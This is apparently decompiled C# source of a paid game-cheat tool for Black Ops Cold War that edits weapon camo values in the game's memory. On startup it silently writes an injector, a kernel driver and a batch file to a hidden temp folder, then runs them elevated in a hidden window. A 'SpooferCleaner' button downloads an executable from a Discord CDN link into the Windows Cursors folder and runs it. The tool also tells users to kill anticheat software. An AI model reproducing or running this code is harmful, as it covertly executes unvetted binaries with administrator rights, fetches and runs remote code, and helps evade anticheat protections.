using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Windows.Forms;
using FAZEDAuth;
using Guna.UI2.WinForms;
using kernalthingy;
using MainDriver;

namespace CWTesting
{
	// Token: 0x0200002D RID: 45
	public partial class Form1 : Form
	{
		// Token: 0x06000199 RID: 409 RVA: 0x00009530 File Offset: 0x00009530
		public void startInstall(string wK)
		{
			Process process = new Process();
			process.StartInfo.FileName = wK;
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Verb = "runas";
			process.Start();
			process.WaitForExit();
		}

		// Token: 0x0600019A RID: 410 RVA: 0x00009584 File Offset: 0x00009584
		private void deleteSys()
		{
			string[] files = Directory.GetFiles(Path.GetTempPath(), "*.sys", SearchOption.AllDirectories);
			try
			{
				File.Delete(files[0]);
			}
			catch
			{
			}
		}

		// Token: 0x0600019B RID: 411 RVA: 0x000095C0 File Offset: 0x000095C0
		public static string randomStr(int wM)
		{
			return new string((from s in Enumerable.Repeat<string>("aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789", wM)
			select s[Form1.vm.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x0600019C RID: 412 RVA: 0x000095FC File Offset: 0x000095FC
		private void writeInstall()
		{
			string text = Path.GetTempPath() + Form1.randomStr(8) + "." + Form1.randomStr(3);
			if (!Directory.Exists(text))
			{
				string path = text;
				Directory.CreateDirectory(path).Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				string str = text + "\\";
				File.WriteAllBytes(str + "inject.exe", AD.AF());
				File.WriteAllBytes(str + "Driver.sys", AD.AE());
				File.WriteAllBytes(str + "install.bat", AD.AG());
				this.startInstall(str + "install.bat");
				this.pathh = path;
				try
				{
					Directory.Delete(path, true);
					return;
				}
				catch
				{
					try
					{
						Directory.Delete(this.pathh, true);
					}
					catch
					{
					}
					return;
				}
			}
			MessageBox.Show("Please try again!");
		}

		// Token: 0x0600019D RID: 413 RVA: 0x000096EC File Offset: 0x000096EC
		public Form1()
		{
			this.InitializeComponent();
			this.deleteSys();
			this.writeInstall();
			this.m = new gV();
			if (!this.m.proc("BlackOpsColdWar"))
			{
				MessageBox.Show("Please Have CW Open Before Using Program. If it is open make sure to kill any installed anticheats (Riot Vanguard most likely)");
				Application.Exit();
			}
		}

		// Token: 0x0600019E RID: 414 RVA: 0x00009740 File Offset: 0x00009740
		private void Form1_Load(object sender, EventArgs e)
		{
			this.key.Text = "Username: " + LoginMenu.King.user_data.username;
			this.expiry.Text = "Expiry: " + this.UnixTimeToDateTime(long.Parse(LoginMenu.King.user_data.subscriptions[0].expiry)).ToString();
			this.version.Text = "Version: " + LoginMenu.King.version;
		}

		// Token: 0x0600019F RID: 415 RVA: 0x000097D4 File Offset: 0x000097D4
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			result = result.AddSeconds((double)unixtime).ToLocalTime();
			return result;
		}

		// Token: 0x060001A0 RID: 416 RVA: 0x00009808 File Offset: 0x00009808
		private void scanBtn_Click(object sender, EventArgs e)
		{
			gV gV = this.m;
			byte?[] needle = new byte?[]
			{
				new byte?(1),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(3),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(0),
				new byte?(15),
				new byte?(163),
				null,
				new byte?(175)
			};
			long startAddress = (long)(this.m.BaseAddress + 268435456UL);
			long endAddress = (long)(this.m.BaseAddress + 520093696UL);
			ulong address = gV.FindBytes(needle, (ulong)startAddress, (ulong)endAddress, true, 65535)[0];
			if (this.m.IsValidAddr(address))
			{
				this.outputBox.Text = "Camo Addr: 0x" + address.ToString("X");
				this.scan = address;
				return;
			}
			this.outputBox.Text = "Unable to find address, make sure that one of your camos is shards.";
		}

		// Token: 0x060001A1 RID: 417 RVA: 0x000099B0 File Offset: 0x000099B0
		private void logInButton2_Click(object sender, EventArgs e)
		{
			if (this.m.IsValidAddr(this.scan))
			{
				this.m.WriteByte(this.scan, Convert.ToByte(Form1.Camos.nvc.Get(this.comboBox2.Text), 10), false);
			}
		}

		// Token: 0x060001A2 RID: 418 RVA: 0x00005140 File Offset: 0x00005140
		private void logInThemeContainer1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001A3 RID: 419 RVA: 0x00009A01 File Offset: 0x00009A01
		private void logInButton1_Click(object sender, EventArgs e)
		{
			MessageBox.Show("1. Set Shards Camo On The Gun You Want To Set A Pap Camo. | 2. Scan Address. | 3. Select PAP Camo In Combo Box. | 4. Set The Camo.  ");
		}

		// Token: 0x060001A4 RID: 420 RVA: 0x00009A0E File Offset: 0x00009A0E
		private void SpooferCleaner_Click(object sender, EventArgs e)
		{
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/967859990067032064/974441054059253780/Spoof.exe", "C:\\Windows\\Cursors\\Spoof.exe");
			MessageBox.Show("Running Drivers..", "Please Wait, Loading..", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			Process.Start("C:\\Windows\\Cursors\\Spoof.exe");
		}

		// Token: 0x060001A5 RID: 421 RVA: 0x00009A42 File Offset: 0x00009A42
		private void Label_Title_MouseDown(object sender, MouseEventArgs e)
		{
			this.bool_0 = true;
			this.point_0 = e.Location;
		}

		// Token: 0x060001A6 RID: 422 RVA: 0x00009A58 File Offset: 0x00009A58
		private void Label_Title_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.bool_0)
			{
				base.Location = new Point(base.Location.X - this.point_0.X + e.X, base.Location.Y - this.point_0.Y + e.Y);
				base.Update();
			}
		}

		// Token: 0x060001A7 RID: 423 RVA: 0x00009AC0 File Offset: 0x00009AC0
		private void Label_Title_MouseUp(object sender, MouseEventArgs e)
		{
			this.bool_0 = false;
		}

		// Token: 0x060001A8 RID: 424 RVA: 0x00009AC9 File Offset: 0x00009AC9
		private void button1_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x04000105 RID: 261
		private gV m;

		// Token: 0x04000106 RID: 262
		private string pathh;

		// Token: 0x04000107 RID: 263
		private static Random vm = new Random();

		// Token: 0x04000108 RID: 264
		private ulong scan;

		// Token: 0x04000109 RID: 265
		private bool bool_0;

		// Token: 0x0400010A RID: 266
		private Point point_0;

		// Token: 0x0400010B RID: 267
		public static bool bool_1 = true;

		// Token: 0x0400010C RID: 268
		public static byte[] byte_0 = new byte[1];

		// Token: 0x0400010D RID: 269
		public static ulong ulong_0 = 0UL;

		// Token: 0x0400010E RID: 270
		public static ulong ulong_1 = 0UL;

		// Token: 0x0400010F RID: 271
		public static bool bool_2 = false;

		// Token: 0x04000110 RID: 272
		public static bool bool_3 = false;

		// Token: 0x04000111 RID: 273
		public static bool bool_4 = false;

		// Token: 0x04000112 RID: 274
		public static bool bool_5 = false;

		// Token: 0x04000113 RID: 275
		public static bool bool_6 = false;

		// Token: 0x04000114 RID: 276
		public static bool bool_7 = false;

		// Token: 0x04000116 RID: 278
		private ComboBox comboBox1;

		// Token: 0x0200002E RID: 46
		private class Camos
		{
			// Token: 0x060001AC RID: 428 RVA: 0x0000AE38 File Offset: 0x0000AE38
			static Camos()
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection["PAP 1"] = "67";
				nameValueCollection["PAP 2"] = "68";
				nameValueCollection["PAP 3"] = "69";
				nameValueCollection["PAP 4"] = "115";
				nameValueCollection["PAP 5"] = "116";
				nameValueCollection["PAP 6"] = "117";
				nameValueCollection["PAP 7"] = "118";
				nameValueCollection["PAP 8"] = "119";
				nameValueCollection["PAP 9"] = "120";
				nameValueCollection["PAP 10"] = "121";
				nameValueCollection["GOLD"] = "61";
				nameValueCollection["DIAMOND"] = "62";
				nameValueCollection["DM ULTRA"] = "63";
				nameValueCollection["GOLDEN ADDER"] = "64";
				nameValueCollection["DARK AETHER"] = "66";
				Form1.Camos.nvc = nameValueCollection;
			}

			// Token: 0x04000125 RID: 293
			public static NameValueCollection nvc;
		}
	}
}
